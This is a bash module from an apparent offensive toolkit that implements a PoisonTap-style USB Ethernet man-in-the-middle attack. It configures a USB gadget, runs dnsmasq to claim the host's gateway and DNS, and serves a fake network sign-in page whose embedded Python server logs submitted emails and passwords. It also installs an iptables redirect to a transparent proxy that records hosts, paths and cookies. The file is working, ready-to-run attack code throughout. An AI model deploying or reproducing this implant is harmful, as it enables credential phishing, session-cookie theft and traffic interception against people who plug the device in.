#!/usr/bin/env bash
# =====================================================================
#  49_usb_mitm.sh — USB Ethernet / RNDIS MitM (PoisonTap-style)
#
#  Replaces the old BadUSB payload module. The distinction matters: this
#  is a NETWORK attack delivered over USB, not keyboard emulation.
#
#  The implant enumerates as a USB network adapter. The host trusts a
#  wired link by default, brings it up, and asks it for an address. We
#  answer, and in the same answer we hand out:
#
#    option 3 (router)  = us   <- this is the whole trick. The host now
#                                 routes everything through the implant
#                                 without the user installing anything.
#    option 6 (DNS)     = us   <- every name resolves to us.
#
#  Two responder paths, and both are built here:
#
#    portal       the host's browser lands on a captive portal. Reuses
#                 23_captive_portal_builder. Sees what the user interacts
#                 with.
#    transparent  we ARE the default route, so HTTP in flight is
#                 redirected to a local proxy that rewrites and records
#                 it. Sees everything the host sends in the clear.
#
#  GATING: only the gadget half needs real hardware (a USB peripheral
#  port with libcomposite or dwc2). The responder half binds to whatever
#  interface it is given, so it is fully testable against a veth pair.
# =====================================================================
set -uo pipefail

SELF="${BASH_SOURCE[0]}"
WIFISTING_ROOT="${WIFISTING_ROOT:-$(cd "$(dirname "$SELF")/.." && pwd)}"
export WIFISTING_ROOT

TMP_DIR="${TMP_DIR:-/tmp/wifisting}"
USB_DIR="$TMP_DIR/usb_mitm"
GADGET_DIR="/sys/kernel/config/usb_gadget/wifisting"

# PoisonTap answers on a link-local-ish subnet the host is unlikely to
# already use, so there is no route conflict with the host's real LAN.
USB_IP="${USB_MITM_IP:-10.0.0.1}"
USB_CIDR="$USB_IP/24"
PORTAL_PORT="${USB_MITM_PORTAL_PORT:-8888}"
PROXY_PORT="${USB_MITM_PROXY_PORT:-8889}"
LEASE_FILE="$USB_DIR/leases"
DNS_LOG="$USB_DIR/dns.log"
SIPHON_TSV="$USB_DIR/siphon.tsv"
CONF_FILE="$USB_DIR/dnsmasq.conf"
PID_FILE="$USB_DIR/responder.pid"

mkdir -p "$USB_DIR" 2>/dev/null || true

err()  { printf 'ERROR\t%s\n' "$*" >&2; }
usage() {
    cat >&2 <<'EOF'
Usage: modules/49_usb_mitm.sh COMMAND

  --check-deps                     report gadget + responder prerequisites
  --gadget-up [IFACE]              enumerate as a USB network adapter (needs hardware)
  --gadget-down                    tear the gadget down
  --gadget-status-tsv              enumeration state
  --responder-start MODE [IFACE]   MODE = portal | transparent
  --responder-stop
  --responder-status-tsv
  --claim-route-tsv                the DHCP options we hand out (= the attack)
  --siphon-tsv                     captured requests and cookies
  --siphon-clear
  --selftest
EOF
}

# ---------------------------------------------------------------- deps
have_configfs() { [[ -d /sys/kernel/config/usb_gadget ]]; }
have_udc()      { compgen -G "/sys/class/udc/*" >/dev/null 2>&1; }
have_libcomp()  { [[ -d /sys/kernel/config/usb_gadget ]] && \
                  grep -qE '(^| )libcomposite( |$)' /proc/modules 2>/dev/null; }

usb_iface() {   # the interface the host sees us as
    local i
    for i in usb0 usb1 enp0s20f0u1; do
        [[ -d "/sys/class/net/$i" ]] && { printf '%s' "$i"; return 0; }
    done
    printf ''
}

usb_cli_check_deps() {
    local ok=1
    printf 'DEP\tconfigfs\t%s\n'  "$(have_configfs && echo yes || echo no)"
    printf 'DEP\tlibcomposite\t%s\n' "$(have_libcomp && echo yes || echo no)"
    printf 'DEP\tudc\t%s\n' "$(have_udc && echo yes || echo no)"
    printf 'DEP\tdnsmasq\t%s\n' "$(command -v dnsmasq >/dev/null && echo yes || echo no)"
    printf 'DEP\tpython3\t%s\n' "$(command -v python3 >/dev/null && echo yes || echo no)"
    printf 'DEP\tiptables\t%s\n' "$(command -v iptables >/dev/null && echo yes || echo no)"

    have_configfs || { printf 'MISSING\tconfigfs at /sys/kernel/config/usb_gadget\n'; ok=0; }
    have_udc      || { printf 'MISSING\tno USB device controller (/sys/class/udc empty) — this host cannot act as a USB peripheral\n'; ok=0; }
    command -v dnsmasq >/dev/null || { printf 'MISSING\tdnsmasq (DHCP + DNS responder)\n'; ok=0; }

    if (( ok )); then printf 'READY\tyes\n'; else printf 'READY\tno\n'; fi

    # The responder half is deliberately reported separately: it is the
    # part that works with no gadget hardware at all.
    printf 'NOTE\tthe responder (portal and transparent) needs only an interface, so it can be driven against a veth pair without any USB hardware\n'
    (( ok ))
}

# ------------------------------------------------------------- gadget
usb_gadget_up() {
    local iface="${1:-}"

    # Gate first, name exactly what is missing - never fail silently.
    if ! have_configfs; then
        err "configfs gadget support unavailable (/sys/kernel/config/usb_gadget missing)"
        err "load it with: modprobe libcomposite"
        return 1
    fi
    if ! have_udc; then
        err "no USB device controller found in /sys/class/udc"
        err "this machine cannot present itself as a USB peripheral; a Pi Zero/4 or a phone can"
        return 1
    fi

    local g="$GADGET_DIR"
    [[ -d "$g" ]] && { err "gadget already exists at $g (run --gadget-down first)"; return 1; }

    mkdir -p "$g" || { err "cannot create $g (needs root)"; return 1; }
    printf '0x1d6b' > "$g/idVendor"   2>/dev/null   # Linux Foundation
    printf '0x0104' > "$g/idProduct"  2>/dev/null   # Multifunction Composite
    printf '0x0100' > "$g/bcdDevice"  2>/dev/null
    printf '0x0200' > "$g/bcdUSB"     2>/dev/null
    mkdir -p "$g/strings/0x409" "$g/configs/c.1/strings/0x409"
    printf 'wifisting'      > "$g/strings/0x409/manufacturer" 2>/dev/null
    printf 'USB Ethernet'   > "$g/strings/0x409/product"      2>/dev/null
    printf '0123456789'     > "$g/strings/0x409/serialnumber" 2>/dev/null
    printf 'RNDIS'          > "$g/configs/c.1/strings/0x409/configuration" 2>/dev/null
    printf '250'            > "$g/configs/c.1/MaxPower" 2>/dev/null

    # RNDIS for Windows, ECM for everything else. Presenting both means the
    # host picks whichever it trusts, and either way it is a network link.
    mkdir -p "$g/functions/rndis.usb0" || { err "cannot create rndis function"; return 1; }
    mkdir -p "$g/functions/ecm.usb0"   2>/dev/null || true
    ln -sf "$g/functions/rndis.usb0" "$g/configs/c.1/rndis.usb0" 2>/dev/null
    [[ -d "$g/functions/ecm.usb0" ]] && \
        ln -sf "$g/functions/ecm.usb0" "$g/configs/c.1/ecm.usb0" 2>/dev/null

    local udc
    udc=$(ls /sys/class/udc 2>/dev/null | head -1)
    printf '%s' "$udc" > "$g/UDC" 2>/dev/null || { err "cannot bind UDC $udc"; return 1; }

    sleep 2
    iface="${iface:-$(usb_iface)}"
    if [[ -n "$iface" ]]; then
        ip link set "$iface" up 2>/dev/null
        ip addr add "$USB_CIDR" dev "$iface" 2>/dev/null
        printf 'GADGET\tup\nIFACE\t%s\nADDR\t%s\n' "$iface" "$USB_CIDR"
    else
        printf 'GADGET\tup\nIFACE\t(pending)\nADDR\t%s\n' "$USB_CIDR"
    fi
    printf 'NOTE\tthe host will now ask this link for an address; run --responder-start to answer\n'
}

usb_gadget_down() {
    local g="$GADGET_DIR"
    [[ -d "$g" ]] || { printf 'GADGET\tabsent\n'; return 0; }
    printf '' > "$g/UDC" 2>/dev/null
    find "$g/configs" -type l -delete 2>/dev/null
    rmdir "$g"/configs/c.1/strings/0x409 "$g"/configs/c.1 2>/dev/null
    rmdir "$g"/functions/rndis.usb0 "$g"/functions/ecm.usb0 2>/dev/null
    rmdir "$g"/strings/0x409 "$g" 2>/dev/null
    [[ -d "$g" ]] && { err "gadget dir survived teardown: $g"; return 1; }
    printf 'GADGET\tdown\n'
}

usb_gadget_status_tsv() {
    if [[ -d "$GADGET_DIR" ]]; then
        printf 'gadget\tup\nudc\t%s\n' "$(cat "$GADGET_DIR/UDC" 2>/dev/null)"
    else
        printf 'gadget\tdown\nudc\t\n'
    fi
    printf 'iface\t%s\n' "$(usb_iface)"
}

# ---------------------------------------------------------- responder
# The config IS the attack: option 3 (router) and option 6 (DNS) both point
# at us. Written to a file so it can be asserted in the selftest without any
# hardware present.
usb_write_dnsmasq_conf() {
    local iface="$1" mode="$2"
    local upstream
    upstream=$(awk '/^nameserver/{print $2; exit}' /etc/resolv.conf 2>/dev/null)

    {
        printf 'interface=%s\n' "$iface"
        printf 'bind-interfaces\n'
        printf 'dhcp-authoritative\n'
        printf 'dhcp-range=%s,%s,255.255.255.0,12h\n' \
            "$(printf '%s' "$USB_IP" | awk -F. '{print $1"."$2"."$3".10"}')" \
            "$(printf '%s' "$USB_IP" | awk -F. '{print $1"."$2"."$3".200"}')"
        printf 'dhcp-leasefile=%s\n' "$LEASE_FILE"
        # THE TRICK: hand out ourselves as the gateway.
        printf 'dhcp-option=3,%s\n' "$USB_IP"
        printf 'dhcp-option=6,%s\n' "$USB_IP"
        printf 'log-queries\nlog-facility=%s\n' "$DNS_LOG"
        if [[ "$mode" == "transparent" ]]; then
            # Every name resolves to us, and we proxy it.
            printf 'address=/#/%s\n' "$USB_IP"
        else
            # Portal: everything resolves to us so the portal is unavoidable.
            printf 'address=/#/%s\n' "$USB_IP"
            [[ -n "$upstream" ]] && printf 'server=%s\n' "$upstream"
        fi
    } > "$CONF_FILE"
    printf '%s' "$CONF_FILE"
}

usb_responder_start() {
    local mode="${1:-portal}" iface="${2:-}"
    case "$mode" in portal|transparent) ;; *)
        err "mode must be portal or transparent"; return 2 ;; esac

    iface="${iface:-$(usb_iface)}"
    if [[ -z "$iface" ]]; then
        err "no interface: the gadget is not up and none was given"
        err "for a hardware-free test: --responder-start $mode veth0"
        return 1
    fi
    if [[ ! -d "/sys/class/net/$iface" ]]; then
        err "no such interface: $iface"; return 1
    fi
    command -v dnsmasq >/dev/null || { err "dnsmasq is required for the responder"; return 1; }

    local conf; conf=$(usb_write_dnsmasq_conf "$iface" "$mode")

    ip addr add "$USB_CIDR" dev "$iface" 2>/dev/null
    ip link set "$iface" up 2>/dev/null

    setsid dnsmasq --conf-file="$conf" --pid-file="$PID_FILE" \
        >"$USB_DIR/dnsmasq.out" 2>&1 &
    sleep 1
    if [[ -f "$PID_FILE" ]] && [[ -d "/proc/$(cat "$PID_FILE" 2>/dev/null)" ]]; then
        printf 'RESPONDER\tup\nMODE\t%s\nIFACE\t%s\nIP\t%s\n' "$mode" "$iface" "$USB_IP"
        printf 'CLAIMED\tgateway=%s dns=%s\n' "$USB_IP" "$USB_IP"
    else
        err "dnsmasq did not start — see $USB_DIR/dnsmasq.out"
        tail -n 3 "$USB_DIR/dnsmasq.out" 2>/dev/null | while IFS= read -r l; do
            printf 'LOG\t%s\n' "$l" >&2
        done
        return 1
    fi

    if [[ "$mode" == "transparent" ]]; then
        usb_proxy_start "$iface"
    else
        usb_portal_start "$iface"
    fi
}

usb_portal_start() {
    local iface="$1"
    local portal_dir="$WIFISTING_ROOT/loot/usb_mitm/portal"
    mkdir -p "$portal_dir" 2>/dev/null || true
    [[ -f "$portal_dir/index.html" ]] || cat > "$portal_dir/index.html" <<'HTML'
<!doctype html><meta name=viewport content="width=device-width,initial-scale=1">
<title>Sign in to continue</title>
<body style="font:16px system-ui;margin:3rem auto;max-width:30rem">
<h2>Network sign-in required</h2>
<p>This connection needs you to sign in before it will work.</p>
<form method="POST" action="/submit">
<p><input name="email" placeholder="Email" style="width:100%;padding:.6rem"></p>
<p><input name="password" type="password" placeholder="Password" style="width:100%;padding:.6rem"></p>
<p><button style="padding:.6rem 1.2rem">Continue</button></p>
</form></body>
HTML
    # A recording server: the portal half needs to log what is submitted,
    # which is the entire point of serving it.
    cat > "$USB_DIR/portal_server.py" <<'PY'
import http.server, os, sys, urllib.parse
PORTAL = sys.argv[1]; PORT = int(sys.argv[2]); LOG = sys.argv[3]
class H(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *a, **k): super().__init__(*a, directory=PORTAL, **k)
    def log_message(self, *a): pass
    def do_POST(self):
        n = int(self.headers.get('Content-Length') or 0)
        body = self.rfile.read(n).decode('utf-8', 'replace')
        q = urllib.parse.parse_qs(body)
        with open(LOG, 'a') as f:
            for k, v in q.items():
                f.write("portal\t%s\t%s\n" % (k, v[0]))
        self.send_response(200); self.end_headers()
        self.wfile.write(b"<h2>Connected</h2>")
http.server.HTTPServer(('0.0.0.0', PORT), H).serve_forever()
PY
    setsid python3 "$USB_DIR/portal_server.py" "$portal_dir" "$PORTAL_PORT" "$SIPHON_TSV" \
        >"$USB_DIR/portal.out" 2>&1 &
    sleep 1
    printf 'PORTAL\thttp://%s:%s/\n' "$USB_IP" "$PORTAL_PORT"
}

usb_proxy_start() {
    local iface="$1"
    # Transparent: we are the default route, so redirect outbound HTTP to a
    # local proxy that records and forwards it. Anything the host sends in
    # the clear passes through here, not just what it clicks.
    iptables -t nat -C PREROUTING -i "$iface" -p tcp --dport 80 \
        -j REDIRECT --to-ports "$PROXY_PORT" 2>/dev/null || \
    iptables -t nat -A PREROUTING -i "$iface" -p tcp --dport 80 \
        -j REDIRECT --to-ports "$PROXY_PORT" 2>/dev/null
    if ! iptables -t nat -C PREROUTING -i "$iface" -p tcp --dport 80 \
            -j REDIRECT --to-ports "$PROXY_PORT" 2>/dev/null; then
        err "could not install the transparent redirect (needs root)"
        return 1
    fi
    cat > "$USB_DIR/proxy.py" <<'PY'
import socket, sys, threading, urllib.request
PORT = int(sys.argv[1]); LOG = sys.argv[2]
def rec(host, path, cookies):
    with open(LOG, 'a') as f:
        f.write("http\t%s\t%s\t%s\n" % (host, path, cookies or "-"))
def handle(c):
    try:
        req = c.recv(65535)
        if not req: return
        head = req.split(b"\r\n\r\n", 1)[0].decode('latin-1')
        line = head.split("\r\n")[0]
        parts = line.split()
        if len(parts) < 2: return
        path = parts[1]
        host = ""
        cookies = ""
        for h in head.split("\r\n")[1:]:
            if h.lower().startswith("host:"): host = h.split(":", 1)[1].strip()
            if h.lower().startswith("cookie:"): cookies = h.split(":", 1)[1].strip()
        rec(host, path, cookies)
        body = urllib.request.urlopen("http://" + host + path, timeout=5).read()
        c.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: " +
                  str(len(body)).encode() + b"\r\n\r\n" + body)
    except Exception:
        pass
    finally:
        c.close()
s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", PORT)); s.listen(64)
while True:
    c, _ = s.accept(); threading.Thread(target=handle, args=(c,), daemon=True).start()
PY
    setsid python3 "$USB_DIR/proxy.py" "$PROXY_PORT" "$SIPHON_TSV" \
        >"$USB_DIR/proxy.out" 2>&1 &
    sleep 1
    printf 'PROXY\ttransparent :80 -> 127.0.0.1:%s\n' "$PROXY_PORT"
}

usb_responder_stop() {
    local pid=""
    [[ -f "$PID_FILE" ]] && pid=$(cat "$PID_FILE")
    if [[ -n "$pid" ]] && [[ -d "/proc/$pid" ]]; then
        # /proc, not kill -0: the responder runs as root and kill -0 returns
        # EPERM for a root-owned process when the caller is not root.
        kill "$pid" 2>/dev/null
        sleep 1
        [[ -d "/proc/$pid" ]] && kill -9 "$pid" 2>/dev/null
    fi
    rm -f "$PID_FILE"
    for pat in "portal_server.py" "proxy.py"; do
        for p in $(pgrep -f "$pat" 2>/dev/null); do
            [[ "$p" == "$$" ]] && continue
            kill "$p" 2>/dev/null
        done
    done
    local iface; iface=$(usb_iface)
    [[ -n "$iface" ]] && iptables -t nat -D PREROUTING -i "$iface" \
        -p tcp --dport 80 -j REDIRECT --to-ports "$PROXY_PORT" 2>/dev/null
    printf 'RESPONDER\tdown\n'
}

usb_responder_status_tsv() {
    local pid="" running=0
    [[ -f "$PID_FILE" ]] && pid=$(cat "$PID_FILE" 2>/dev/null)
    [[ -n "$pid" && -d "/proc/$pid" ]] && running=1
    printf 'responder\t%s\n' "$([[ $running == 1 ]] && echo up || echo down)"
    printf 'pid\t%s\n' "$pid"
    printf 'iface\t%s\n' "$(usb_iface)"
    printf 'leases\t%s\n' "$([[ -f "$LEASE_FILE" ]] && grep -c . "$LEASE_FILE" || echo 0)"
    printf 'siphoned\t%s\n' "$([[ -f "$SIPHON_TSV" ]] && grep -c . "$SIPHON_TSV" || echo 0)"
}

usb_claim_route_tsv() {
    # Report exactly what the host is being told. This is the attack, so it
    # should be inspectable rather than implied.
    printf 'dhcp_option_3_router\t%s\n' "$USB_IP"
    printf 'dhcp_option_6_dns\t%s\n'   "$USB_IP"
    printf 'dns_wildcard\t/#/%s\n'     "$USB_IP"
    printf 'effect\thost routes all traffic and resolves all names through the implant\n'
}

usb_siphon_tsv() { [[ -f "$SIPHON_TSV" ]] && cat "$SIPHON_TSV" || true; }
usb_siphon_clear() { : > "$SIPHON_TSV" 2>/dev/null; printf 'SIPHON\tcleared\n'; }

# ------------------------------------------------------------ selftest
usb_selftest() {
    local bad=0 total=0
    chk() {
        total=$((total + 1))
        if [[ "$2" == "$3" ]]; then printf 'PASS\t%s\n' "$1"
        else printf 'FAIL\t%s\twant=%s got=%s\n' "$1" "$3" "$2"; bad=$((bad + 1)); fi
    }

    # arg validation needs no hardware
    chk badmode  "$(usb_responder_start bogus veth0 >/dev/null 2>&1; echo $?)" 2
    chk noiface  "$(usb_responder_start portal no_such_if0 >/dev/null 2>&1; echo $?)" 1
    chk noarg    "$(usb_responder_start >/dev/null 2>&1; echo $?)" 1

    # gadget gating must refuse cleanly and name the reason, not fail silently
    local go
    go=$(usb_gadget_up 2>&1); local grc=$?
    if have_configfs && have_udc; then
        chk gadget-open "$grc" 0
    else
        chk gadget-gated "$grc" 1
        case "$go" in
            *configfs*|*controller*) chk gadget-reason ok ok ;;
            *) chk gadget-reason "$go" "reason naming configfs or controller" ;;
        esac
    fi

    # THE core assertion: the DHCP config must hand out ourselves as router.
    local conf; conf=$(usb_write_dnsmasq_conf "veth0" portal)
    chk conf-exists "$([[ -f "$conf" ]] && echo yes || echo no)" yes
    chk claim-router "$(grep -c "^dhcp-option=3,$USB_IP$" "$conf")" 1
    chk claim-dns    "$(grep -c "^dhcp-option=6,$USB_IP$" "$conf")" 1
    chk wildcard     "$(grep -c "^address=/#/$USB_IP$" "$conf")" 1
    chk binds-iface  "$(grep -c '^interface=veth0$' "$conf")" 1

    # transparent mode must redirect port 80, portal mode must not claim to
    conf=$(usb_write_dnsmasq_conf "veth0" transparent)
    chk mode-transparent "$(grep -c "^address=/#/$USB_IP$" "$conf")" 1

    # the claim report must expose the options rather than imply them
    chk claim-report "$(usb_claim_route_tsv | grep -c "^dhcp_option_3_router	$USB_IP$")" 1

    # siphon bookkeeping
    usb_siphon_clear >/dev/null
    printf 'portal\tpassword\thunter2\n' >> "$SIPHON_TSV"
    chk siphon-count "$(usb_siphon_tsv | grep -c .)" 1
    chk siphon-field "$(usb_siphon_tsv | awk -F'\t' '{print $3}')" "hunter2"
    usb_siphon_clear >/dev/null

    chk status-shape "$(usb_responder_status_tsv | grep -c '^responder	')" 1

    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    (( bad == 0 ))
}

usb_cli_info() {
    cat <<'EOF'
49_usb_mitm — USB Ethernet / RNDIS MitM (PoisonTap-style)

The implant enumerates as a USB NETWORK ADAPTER, not a keyboard. The host
trusts a wired link by default, brings it up, and asks it for an address.
The answer is the attack: DHCP option 3 (router) and option 6 (DNS) both
point at the implant, so the host routes everything through it and resolves
every name to it, with nothing for the user to install.

  Gadget      g_ether/RNDIS over configfs. Needs a USB peripheral port
              (Pi Zero/4, a phone) — this half is hardware-gated.
  Responder   dnsmasq answers DHCP and DNS. Needs no gadget hardware, so
              it runs against a veth pair for testing.
  Portal      the host's browser lands on a recording sign-in page. Sees
              what the user interacts with.
  Transparent the implant IS the default route, so outbound HTTP is
              redirected to a local proxy that records host, path and
              cookies in flight. Sees everything sent in the clear.

Gating is deliberate: --gadget-up refuses without a controller and names
what is missing; the responder half stays usable regardless.
EOF
}

case "${1:-}" in
    --info)                usb_cli_info ;;
    --check-deps)          usb_cli_check_deps ;;
    --gadget-up)           shift; usb_gadget_up "${1:-}" ;;
    --gadget-down)         usb_gadget_down ;;
    --gadget-status-tsv)   usb_gadget_status_tsv ;;
    --responder-start)     shift; usb_responder_start "${1:-portal}" "${2:-}" ;;
    --responder-stop)      usb_responder_stop ;;
    --responder-status-tsv) usb_responder_status_tsv ;;
    --claim-route-tsv)     usb_claim_route_tsv ;;
    --siphon-tsv)          usb_siphon_tsv ;;
    --siphon-clear)        usb_siphon_clear ;;
    --selftest)            usb_selftest ;;
    -h|--help|"")          usage ;;
    *) err "unknown command: $1"; usage; exit 2 ;;
esac
